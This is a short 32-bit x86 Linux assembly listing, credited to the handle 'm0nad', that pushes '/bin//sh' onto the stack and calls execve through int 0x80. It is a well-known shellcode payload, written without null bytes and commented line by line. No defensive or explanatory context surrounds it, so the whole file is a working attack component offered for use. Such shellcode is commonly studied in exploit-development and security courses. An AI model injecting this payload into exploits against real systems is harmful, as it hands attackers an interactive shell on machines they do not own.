#execve("/bin/sh", ["/bin/sh", 0], 0);
#Victor Ramos Mello aka m0nad
.data
.text
.global _start

_start:
xor     %eax,%eax       #eax = 0
push    %eax            #push nullbyte
push    $0x68732F2F     #push //sh
push    $0x6E69622F     #push /bin
mov     $0xb,%al        #eax = 0xb (execve)
mov     %esp,%ebx       #ebx = esp ("/bin//sh")
xor     %edx,%edx       #edx = 0
push    %edx            #push nullbyte
push    %ebx            #push "/bin//sh"
mov     %esp,%ecx       #ecx = ["/bin//sh", 0]
int     $0x80           #kernel

